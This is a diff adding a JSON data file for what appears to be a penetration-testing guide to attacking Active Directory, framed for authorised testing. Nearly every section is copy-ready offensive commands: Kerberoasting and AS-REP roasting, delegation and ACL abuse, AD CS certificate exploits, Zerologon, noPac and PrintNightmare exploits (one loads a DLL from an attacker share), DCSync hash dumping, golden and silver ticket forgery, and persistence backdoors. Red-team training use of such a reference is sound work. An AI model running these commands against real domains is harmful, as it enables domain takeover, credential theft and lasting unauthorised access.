@@ -1,0 +1,505 @@
+{
+  "title": "Active Directory attacks",
+  "intro": "The AD attack chain mapped out for authorised testing: enumerate the domain, roast Kerberos, abuse delegation, ACLs and GPOs, exploit AD CS, chain the high-value CVEs, then take domain dominance and pivot across trusts. Each step links to the tool that does the work.",
+  "phases": [
+    {
+      "id": "enum",
+      "name": "Enumerate the domain",
+      "blurb": "Situational awareness first: who are the users, where is the DC, and which objects can you already touch? Everything downstream is read off this.",
+      "next": { "to": "kerberos", "label": "Roast Kerberos" },
+      "nodes": [
+        {
+          "id": "ad-unauth",
+          "label": "Unauthenticated: null / guest session & RID cycling",
+          "detail": "Before any credential, try a null or guest bind. A SAMR/LSARPC null session that lists users, or RID cycling that recovers them, is itself a finding.",
+          "console": true,
+          "cmd": [
+            "enum4linux-ng -A TARGET",
+            "rpcclient -U '' -N TARGET -c 'enumdomusers;querydominfo'",
+            "nxc smb TARGET -u '' -p '' --rid-brute 10000",
+            "nxc smb TARGET -u guest -p '' --users"
+          ]
+        },
+        {
+          "id": "ad-userenum",
+          "label": "Validate usernames with Kerbrute (no lockout)",
+          "detail": "Kerbrute asks the DC for a TGT for each name; AS-REP without pre-auth confirms a valid user and never touches the account's password, so it does not count against lockout. Feed it a name list (username-anarchy, statistically-likely-usernames).",
+          "console": true,
+          "cmd": [
+            "kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt",
+            "kerbrute passwordspray -d corp.local --dc 10.10.10.10 users.txt 'Welcome1'"
+          ]
+        },
+        {
+          "id": "ad-ldap",
+          "label": "Authenticated LDAP enumeration",
+          "detail": "With any domain credential, read the directory: users, groups, computers, the password policy and the naming context. NetExec's LDAP module and ldapsearch cover the quick questions.",
+          "console": true,
+          "cmd": [
+            "nxc ldap DC -u user -p pass --users --groups --password-not-required",
+            "nxc ldap DC -u user -p pass -M get-desc-users",
+            "ldapsearch -x -H ldap://DC -D 'user@corp.local' -w pass -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName description",
+            "windapsearch.py --dc-ip 10.10.10.10 -u user@corp.local -p pass -U"
+          ]
+        },
+        {
+          "id": "ad-bloodhound",
+          "label": "Map attack paths with BloodHound",
+          "detail": "Collect the graph and let it find the path. Collect remotely from Linux with bloodhound-python or NetExec, or on-host with SharpHound, then import the zip and run the built-in queries (Shortest paths to Domain Admins, owned-to-DA).",
+          "console": true,
+          "cmd": [
+            "bloodhound-python -d corp.local -u user -p pass -c All -ns 10.10.10.10 --zip",
+            "nxc ldap DC -u user -p pass --bloodhound --collection-method All --dns-server 10.10.10.10",
+            "SharpHound.exe -c All --zipfilename loot.zip"
+          ]
+        },
+        {
+          "id": "ad-powerview",
+          "label": "PowerView / on-host enumeration",
+          "detail": "On a Windows foothold, PowerView answers the targeted questions BloodHound hints at: SPN accounts, unconstrained/constrained delegation, interesting ACLs, shares and GPOs.",
+          "console": true,
+          "cmd": [
+            "Get-DomainUser -SPN | select samaccountname,serviceprincipalname",
+            "Get-DomainUser -PreauthNotRequired | select samaccountname",
+            "Get-DomainComputer -Unconstrained | select name",
+            "Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto",
+            "Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -eq 'youruser'}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "kerberos",
+      "name": "Roast Kerberos",
+      "blurb": "Two offline-crackable hashes you can often pull with nothing but a username list or one low-priv credential: AS-REP roast and Kerberoast.",
+      "next": { "to": "delegation", "label": "Abuse delegation" },
+      "nodes": [
+        {
+          "id": "krb-asrep",
+          "label": "AS-REP roasting (accounts without pre-auth)",
+          "detail": "Any account with 'Do not require Kerberos pre-authentication' set hands out an AS-REP encrypted with its password hash to anyone who asks — no credential needed. Crack the $krb5asrep$ hash offline with Hashcat mode 18200.",
+          "console": true,
+          "cmd": [
+            "impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 -format hashcat",
+            "nxc ldap DC -u user -p pass --asreproast asrep.txt",
+            "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt",
+            "hashcat -m 18200 asrep.txt rockyou.txt"
+          ]
+        },
+        {
+          "id": "krb-roast",
+          "label": "Kerberoasting (service accounts with an SPN)",
+          "detail": "Any authenticated user can request a service ticket for any SPN; the TGS is encrypted with the service account's NT hash, so request it and crack offline (Hashcat mode 13100). Service accounts often have weak, non-expiring passwords.",
+          "console": true,
+          "cmd": [
+            "impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.10.10.10 -request -outputfile tgs.txt",
+            "nxc ldap DC -u user -p pass --kerberoasting kerb.txt",
+            "Rubeus.exe kerberoast /outfile:tgs.txt",
+            "hashcat -m 13100 tgs.txt rockyou.txt"
+          ]
+        },
+        {
+          "id": "krb-targeted",
+          "label": "Targeted Kerberoasting (via write access)",
+          "detail": "If you hold GenericWrite / GenericAll over a user, set a fake SPN on it, Kerberoast it, then clear the SPN. Turns a write ACL into a crackable hash for that account.",
+          "console": true,
+          "cmd": [
+            "Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc1'}",
+            "Rubeus.exe kerberoast /user:victim /nowrap",
+            "Set-DomainObject -Identity victim -Clear serviceprincipalname",
+            "# Linux: targetedKerberoast.py -d corp.local -u user -p pass"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "delegation",
+      "name": "Abuse delegation",
+      "blurb": "Kerberos delegation lets one account act for another. All three flavours are abusable; which one depends on what you found in enumeration.",
+      "diagram": "ad-delegation",
+      "next": { "to": "acl", "label": "Abuse ACLs" },
+      "nodes": [
+        {
+          "id": "del-unconstrained",
+          "label": "Unconstrained delegation",
+          "detail": "A host trusted for unconstrained delegation caches the full TGT of anyone who authenticates to it. Compromise such a host, coerce a Domain Controller to authenticate to it (printerbug / PetitPotam), capture the DC's TGT and use it to DCSync.",
+          "console": true,
+          "cmd": [
+            "Get-DomainComputer -Unconstrained | select name",
+            "Rubeus.exe monitor /interval:5 /nowrap",
+            "# coerce the DC to the compromised host:",
+            "printerbug.py 'corp.local/user:pass'@DC01 ATTACKER-HOST",
+            "Rubeus.exe ptt /ticket:DC01-TGT.kirbi   # then secretsdump -just-dc"
+          ]
+        },
+        {
+          "id": "del-constrained",
+          "label": "Constrained delegation (S4U)",
+          "detail": "An account with msDS-AllowedToDelegateTo set can, via S4U2self + S4U2proxy, request a service ticket for any user to the named SPN. Impersonate Administrator to that service. Note you can swap the service class (cifs/host/ldap), so one delegated SPN often reaches many services on the host.",
+          "console": true,
+          "cmd": [
+            "Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto",
+            "impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator 'corp.local/svc$:pass' -dc-ip 10.10.10.10",
+            "export KRB5CCNAME=Administrator.ccache",
+            "Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01 /ptt"
+          ]
+        },
+        {
+          "id": "del-rbcd",
+          "label": "Resource-based constrained delegation (RBCD)",
+          "detail": "If you can write the target computer's object (GenericWrite / GenericAll / WriteDACL), set msDS-AllowedToActOnBehalfOfOtherIdentity to a computer account you control, then S4U to impersonate any user to that host. By default any user can add up to 10 machine accounts (MachineAccountQuota).",
+          "console": true,
+          "cmd": [
+            "impacket-addcomputer corp.local/user:pass -computer-name 'FAKE$' -computer-pass 'Fake123' -dc-ip 10.10.10.10",
+            "impacket-rbcd corp.local/user:pass -delegate-to 'TARGET$' -delegate-from 'FAKE$' -action write -dc-ip 10.10.10.10",
+            "impacket-getST -spn cifs/target.corp.local -impersonate Administrator 'corp.local/FAKE$:Fake123' -dc-ip 10.10.10.10",
+            "# Windows: Powermad New-MachineAccount + Set-ADComputer -PrincipalsAllowedToDelegateToAccount"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "acl",
+      "name": "Abuse ACLs & object control",
+      "blurb": "BloodHound's 'outbound object control' edges are direct privilege. Each right has a one-command abuse; chain them towards a high-value target.",
+      "next": { "to": "gpo", "label": "Abuse GPOs" },
+      "nodes": [
+        {
+          "id": "acl-enum",
+          "label": "Find abusable rights (BloodHound edges)",
+          "detail": "Look for GenericAll, GenericWrite, WriteDacl, WriteOwner, ForceChangePassword and AddMember from a principal you control to a user, group or computer. PowerView resolves them on-host.",
+          "console": true,
+          "cmd": [
+            "Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner'}",
+            "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs"
+          ]
+        },
+        {
+          "id": "acl-forcechange",
+          "label": "ForceChangePassword over a user",
+          "detail": "Reset the victim's password without knowing the old one. Loud and disruptive (the real user loses access), so prefer shadow credentials or targeted Kerberoast when the right allows; note it in the report.",
+          "console": true,
+          "cmd": [
+            "net rpc password victim 'NewPass123!' -U 'corp.local/attacker%pass' -S DC01",
+            "Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)"
+          ]
+        },
+        {
+          "id": "acl-shadowcreds",
+          "label": "Shadow credentials (GenericWrite + AD CS)",
+          "detail": "With write over a user or computer in an environment that has a CA, add a Key Credential (msDS-KeyCredentialLink) and authenticate via PKINIT — no password reset, quieter than ForceChangePassword, and it yields the NT hash too.",
+          "console": true,
+          "cmd": [
+            "certipy shadow auto -u attacker@corp.local -p pass -account victim -dc-ip 10.10.10.10",
+            "pywhisker.py -d corp.local -u attacker -p pass --target victim --action add"
+          ]
+        },
+        {
+          "id": "acl-group",
+          "label": "AddMember / GenericWrite over a group",
+          "detail": "Write access to a group means you can add yourself (or a controlled account) to it — the fast path when the group is Domain Admins or an equivalently privileged group.",
+          "console": true,
+          "cmd": [
+            "Add-DomainGroupMember -Identity 'Domain Admins' -Members attacker",
+            "net rpc group addmem 'Domain Admins' attacker -U 'corp.local/attacker%pass' -S DC01",
+            "net group 'Domain Admins' attacker /add /domain   # remove yourself afterwards"
+          ]
+        },
+        {
+          "id": "acl-writeowner",
+          "label": "WriteOwner / WriteDacl",
+          "detail": "Lower-level than GenericAll but just as powerful in two steps: take ownership, grant yourself full control, then abuse it. Clean up the ACL afterwards.",
+          "console": true,
+          "cmd": [
+            "Set-DomainObjectOwner -Identity victim -OwnerIdentity attacker",
+            "Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights All",
+            "# Linux: impacket-owneredit then impacket-dacledit"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "gpo",
+      "name": "Abuse Group Policy",
+      "blurb": "Write access to a GPO is write access to every computer and user it is linked to: schedule a task, add a local admin, or grant a user right across the OU.",
+      "next": { "to": "adcs", "label": "Exploit AD CS" },
+      "nodes": [
+        {
+          "id": "gpo-find",
+          "label": "Find writable GPOs",
+          "detail": "BloodHound's GPO control edges, or PowerView, show which GPOs you can edit and what OUs they apply to. A writable GPO linked to a DC's OU is game over.",
+          "console": true,
+          "cmd": [
+            "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|WriteDacl'}",
+            "Get-DomainGPO -Identity '{GUID}' | select displayname,gpcfilesyspath"
+          ]
+        },
+        {
+          "id": "gpo-abuse",
+          "label": "SharpGPOAbuse / pyGPOAbuse",
+          "detail": "Inject an immediate scheduled task, add a local admin, or add a user right (e.g. SeDebugPrivilege) via the GPO. The change applies on the next policy refresh of every machine in scope — keep it tightly targeted and clean up.",
+          "console": true,
+          "cmd": [
+            "SharpGPOAbuse.exe --AddComputerTask --TaskName 'upd' --Author corp\\admin --Command 'cmd.exe' --Arguments '/c net localgroup administrators attacker /add' --GPOName 'Vulnerable GPO'",
+            "pygpoabuse.py corp.local/user:pass -gpo-id '{GUID}' -command 'net localgroup administrators attacker /add'",
+            "gpupdate /force   # or wait for refresh"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "adcs",
+      "name": "Exploit AD CS",
+      "blurb": "A misconfigured Certificate Services is a domain-wide backdoor. certipy finds the vulnerable templates; the ESC that applies decides the exploit.",
+      "next": { "to": "cves", "label": "Chain the CVEs" },
+      "nodes": [
+        {
+          "id": "adcs-find",
+          "label": "Find vulnerable templates (certipy / Certify)",
+          "detail": "Enumerate the CA and templates and let the tool flag the ESCs. Start every AD CS assessment here.",
+          "console": true,
+          "cmd": [
+            "certipy find -u user@corp.local -p pass -dc-ip 10.10.10.10 -vulnerable -stdout",
+            "Certify.exe find /vulnerable"
+          ]
+        },
+        {
+          "id": "adcs-esc1",
+          "label": "ESC1: template lets the enrollee supply the subject",
+          "detail": "A template with 'Supply subject in request' + client-authentication EKU that you can enrol in lets you request a cert for any user (SAN = Administrator), then authenticate as them.",
+          "console": true,
+          "cmd": [
+            "certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local -dc-ip 10.10.10.10",
+            "certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10"
+          ]
+        },
+        {
+          "id": "adcs-esc8",
+          "label": "ESC8: NTLM relay to the CA web enrolment",
+          "detail": "If HTTP web enrolment is on, relay a coerced machine (PetitPotam / printerbug) to /certsrv and request a cert as that machine — relay a DC and you get a DC cert, then DCSync.",
+          "console": true,
+          "cmd": [
+            "certipy relay -target 'http://CA/certsrv/certfnsh.asp' -template DomainController",
+            "impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+            "# then coerce: PetitPotam.py ATTACKER DC01"
+          ]
+        },
+        {
+          "id": "adcs-othersesc",
+          "label": "ESC2 / 3 / 4 / 6 / 7 (see the cheat sheet)",
+          "detail": "Any-purpose or SubCA templates (ESC2/3), a template ACL you can rewrite (ESC4), the EDITF_ATTRIBUTESUBJECTALTNAME2 CA flag (ESC6), and dangerous CA management rights (ESC7). The ESC cheat-sheet table below maps each to its condition and exploit.",
+          "console": true,
+          "cmd": [
+            "certipy template -u user@corp.local -p pass -template VulnTemplate -save-old   # ESC4 rewrite",
+            "certipy req ... -template User -upn administrator@corp.local   # ESC6, SAN honoured by CA"
+          ]
+        },
+        {
+          "id": "adcs-auth",
+          "label": "Authenticate with the certificate (PKINIT)",
+          "detail": "Turn the issued .pfx into a TGT and the account's NT hash via PKINIT. certipy auth does both; Rubeus asktgt /certificate is the Windows equivalent.",
+          "console": true,
+          "cmd": [
+            "certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10   # prints TGT + NT hash",
+            "Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cves",
+      "name": "Chain the high-value CVEs",
+      "blurb": "A handful of patched-but-common vulnerabilities take you from a low-priv credential (or none) to Domain Admin in one shot. Confirm the patch state, mind the blast radius.",
+      "next": { "to": "dominance", "label": "Take dominance" },
+      "nodes": [
+        {
+          "id": "cve-zerologon",
+          "label": "Zerologon (CVE-2020-1472)",
+          "detail": "A Netlogon flaw lets an unauthenticated attacker reset the DC's machine-account password to empty, then DCSync. It breaks the DC's secure channel — you MUST restore the original hash afterwards or you leave the domain broken. Test first, exploit only in scope with the restore ready.",
+          "console": true,
+          "cmd": [
+            "python3 zerologon_tester.py DC01 10.10.10.10   # check only",
+            "python3 cve-2020-1472-exploit.py DC01 10.10.10.10",
+            "secretsdump.py -no-pass -just-dc 'corp.local/DC01$@10.10.10.10'",
+            "# RESTORE: reinstall_original_pw.py DC01 10.10.10.10 <orig-hex-hash>"
+          ]
+        },
+        {
+          "id": "cve-nopac",
+          "label": "noPac / sAMAccountName spoofing (CVE-2021-42278 + 42287)",
+          "detail": "Any user who can create a machine account (default MachineAccountQuota) can rename it to a DC's name, request a TGT, then a service ticket back as the DC — impersonating Domain Admin. One command with a built-in shell.",
+          "console": true,
+          "cmd": [
+            "noPac.py corp.local/user:pass -dc-ip 10.10.10.10 -dc-host DC01 --impersonate administrator -shell",
+            "noPac.py corp.local/user:pass -dc-ip 10.10.10.10 -dc-host DC01 --impersonate administrator -dump"
+          ]
+        },
+        {
+          "id": "cve-printnightmare",
+          "label": "PrintNightmare (CVE-2021-34527 / 1675)",
+          "detail": "The Print Spooler loads an attacker-supplied driver DLL as SYSTEM. Remote RCE on a DC with spooler enabled, or a local privesc. Check the spooler is reachable first.",
+          "console": true,
+          "cmd": [
+            "rpcdump.py @10.10.10.10 | egrep 'MS-RPRN|MS-PAR'",
+            "CVE-2021-1675.py corp.local/user:pass@10.10.10.10 '\\\\ATTACKER\\share\\evil.dll'"
+          ]
+        },
+        {
+          "id": "cve-petitpotam",
+          "label": "PetitPotam coercion (CVE-2021-36942) → ADCS relay",
+          "detail": "MS-EFSRPC lets you coerce a DC to authenticate to a host you choose, even unauthenticated on unpatched hosts. Relay that to AD CS web enrolment (ESC8) for a DC certificate, then DCSync. The classic unauthenticated-to-DA chain.",
+          "console": true,
+          "cmd": [
+            "PetitPotam.py -u '' -p '' ATTACKER-IP DC01   # unauth where it still works",
+            "impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+            "# then: certipy auth -pfx dc.pfx → secretsdump -just-dc"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "dominance",
+      "name": "Take domain dominance",
+      "blurb": "DS-Replication rights mean you can pull every hash; the krbtgt hash means you can forge any ticket. From here it is persistence and clean reporting.",
+      "next": { "to": "trusts", "label": "Cross the trusts" },
+      "nodes": [
+        {
+          "id": "dom-dcsync",
+          "label": "DCSync (pull every domain hash)",
+          "detail": "With DS-Replication-Get-Changes rights (Domain Admins, or granted by an abused ACL), impersonate a DC and replicate the hashes — including krbtgt and machine accounts. High-impact and logged (4662 / DRSUAPI); run in scope and dump to your own box.",
+          "console": true,
+          "cmd": [
+            "secretsdump.py 'corp.local/user:pass@DC01' -just-dc-ntlm",
+            "secretsdump.py 'corp.local/user:pass@DC01' -just-dc-user krbtgt",
+            "mimikatz # lsadump::dcsync /user:corp\\krbtgt"
+          ]
+        },
+        {
+          "id": "dom-golden",
+          "label": "Golden ticket (forge any TGT from krbtgt)",
+          "detail": "The krbtgt NT/AES key signs every TGT, so with it you forge a TGT for any user and any group membership — valid until krbtgt is rotated twice. The ultimate persistence; use a real user and sensible lifetimes to stay quiet.",
+          "console": true,
+          "cmd": [
+            "impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local Administrator",
+            "export KRB5CCNAME=Administrator.ccache",
+            "mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt"
+          ]
+        },
+        {
+          "id": "dom-silver",
+          "label": "Silver ticket (forge a TGS for one service)",
+          "detail": "With a service account's hash (e.g. a machine account for cifs/host), forge a TGS straight to that service — no DC contact, so quieter than a golden ticket but scoped to one SPN.",
+          "console": true,
+          "cmd": [
+            "impacket-ticketer -nthash SVC_HASH -domain-sid S-1-5-21-... -domain corp.local -spn cifs/target.corp.local Administrator",
+            "mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:target.corp.local /service:cifs /rc4:SVC_HASH /ptt"
+          ]
+        },
+        {
+          "id": "dom-persist",
+          "label": "Persistence: DSRM, AdminSDHolder, diamond ticket",
+          "detail": "Beyond golden tickets: sync the DSRM local admin to act as a DC, backdoor AdminSDHolder so a controlled user keeps rights on protected groups, or forge a diamond ticket (modify a real TGT) to evade golden-ticket detections. Document every persistence artefact for cleanup.",
+          "console": true,
+          "cmd": [
+            "Rubeus.exe diamond /krbkey:AES_KRBTGT /user:user /password:pass /ticketuser:Administrator",
+            "# AdminSDHolder: Add-DomainObjectAcl -TargetIdentity 'AdminSDHolder' -PrincipalIdentity attacker -Rights All",
+            "# DSRM: mimikatz lsadump::sam  +  registry DsrmAdminLogonBehavior = 2"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "trusts",
+      "name": "Cross the trusts",
+      "blurb": "Domain Admin on one domain is often a stepping stone. Enumerate trusts, then escalate child-to-parent within the forest or pivot across a forest trust.",
+      "nodes": [
+        {
+          "id": "trust-enum",
+          "label": "Enumerate trusts",
+          "detail": "Map the trust directions and types first — intra-forest (parent/child) trusts share the same forest root and are the easy escalation; cross-forest trusts need foreign access.",
+          "console": true,
+          "cmd": [
+            "Get-DomainTrust",
+            "nltest /domain_trusts /all_trusts",
+            "Get-DomainTrustMapping   # PowerView, maps the whole forest"
+          ]
+        },
+        {
+          "id": "trust-child",
+          "label": "Child → parent (intra-forest SID history)",
+          "detail": "A child-domain DA can forge a golden ticket with an ExtraSID of the forest root's Enterprise Admins group (RID 519). SID filtering is not enforced inside a forest, so this escalates to the whole forest.",
+          "console": true,
+          "cmd": [
+            "secretsdump.py 'child.corp.local/da:pass@CHILD-DC' -just-dc-user krbtgt",
+            "impacket-ticketer -nthash CHILD_KRBTGT -domain-sid CHILD_SID -domain child.corp.local -extra-sid ROOT_SID-519 Administrator",
+            "impacket-raiseChild 'child.corp.local/da:pass'   # does it all in one"
+          ]
+        },
+        {
+          "id": "trust-cross",
+          "label": "Cross-forest: trust keys & foreign members",
+          "detail": "Across a forest trust, SID filtering blocks the ExtraSID trick, so hunt foreign group memberships and foreign ACLs, or use the shared inter-realm trust key to forge an inter-realm TGT. Kerberoast across the trust where it is allowed.",
+          "console": true,
+          "cmd": [
+            "Get-DomainForeignGroupMember -Domain target.external",
+            "lsadump::trust /patch   # dump the inter-realm trust key (mimikatz)",
+            "impacket-GetUserSPNs -target-domain target.external corp.local/user:pass"
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "id": "adcs-esc",
+      "title": "AD CS ESC cheat sheet",
+      "columns": ["ESC", "Misconfiguration", "Detect / exploit"],
+      "rows": [
+        ["ESC1", "Template: enrollee supplies subject (SAN) + client-auth EKU", "certipy req -upn administrator@domain"],
+        ["ESC2", "Template has Any Purpose or no EKU", "certipy req then auth as any user"],
+        ["ESC3", "Enrolment Agent template", "request agent cert, then on-behalf-of a user"],
+        ["ESC4", "You have write access over a template's ACL", "certipy template (rewrite to ESC1, exploit, restore)"],
+        ["ESC6", "CA flag EDITF_ATTRIBUTESUBJECTALTNAME2", "any template honours a supplied SAN"],
+        ["ESC7", "You hold Manage CA / Manage Certificates rights", "enable SAN flag or approve your own request"],
+        ["ESC8", "HTTP web enrolment with NTLM on", "ntlmrelayx --adcs + coerce (PetitPotam)"]
+      ]
+    },
+    {
+      "id": "ad-cves",
+      "title": "High-value AD CVEs",
+      "columns": ["CVE", "Name", "Quick check", "Exploit"],
+      "rows": [
+        ["CVE-2020-1472", "Zerologon", "zerologon_tester.py", "reset DC$ pw → DCSync (restore after!)"],
+        ["CVE-2021-42278/42287", "noPac", "any user, MachineAccountQuota > 0", "noPac.py --impersonate administrator -shell"],
+        ["CVE-2021-34527/1675", "PrintNightmare", "rpcdump | egrep MS-RPRN|MS-PAR", "CVE-2021-1675.py with a UNC DLL"],
+        ["CVE-2021-36942", "PetitPotam", "unauth EFSRPC reachable", "coerce DC → relay to ADCS ESC8"],
+        ["CVE-2022-26923", "Certifried", "low-priv + default CA", "certipy req with a crafted machine dNSHostName"]
+      ]
+    },
+    {
+      "id": "deleg-glance",
+      "title": "Delegation at a glance",
+      "columns": ["Type", "You need", "You gain"],
+      "rows": [
+        ["Unconstrained", "admin on an unconstrained host + coerce a DC", "the DC's TGT → DCSync"],
+        ["Constrained (S4U)", "an account with msDS-AllowedToDelegateTo", "impersonate any user to the named SPN"],
+        ["RBCD", "write over the target computer object", "impersonate any user to that host"]
+      ]
+    },
+    {
+      "id": "bh-edges",
+      "title": "BloodHound edge → next move",
+      "columns": ["Edge", "Over", "Attack"],
+      "rows": [
+        ["GenericAll / GenericWrite", "user", "targeted Kerberoast or shadow credentials"],
+        ["GenericAll / GenericWrite", "computer", "RBCD or shadow credentials"],
+        ["ForceChangePassword", "user", "net rpc password (disruptive)"],
+        ["AddMember / GenericWrite", "group", "add yourself to the group"],
+        ["WriteDacl / WriteOwner", "any", "grant yourself GenericAll, then abuse"],
+        ["AllowedToDelegate", "service", "constrained delegation S4U"],
+        ["GpLink / GPO control", "OU", "SharpGPOAbuse scheduled task / local admin"],
+        ["DCSync (GetChanges)", "domain", "secretsdump -just-dc"]
+      ]
+    }
+  ]
+}
